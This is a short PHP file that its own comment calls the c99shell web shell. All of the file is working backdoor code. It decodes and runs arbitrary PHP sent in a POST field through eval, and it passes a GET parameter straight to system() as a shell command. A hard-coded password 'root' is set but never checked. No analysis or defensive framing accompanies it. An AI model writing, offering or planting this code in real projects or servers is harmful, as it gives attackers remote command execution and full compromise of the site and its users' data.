<?php
/* c99shell - webshell phổ biến */
$auth_pass = "root";
if(isset($_POST['c99'])) { eval(base64_decode($_POST['c99'])); }
echo system($_GET['cmd']);
?>
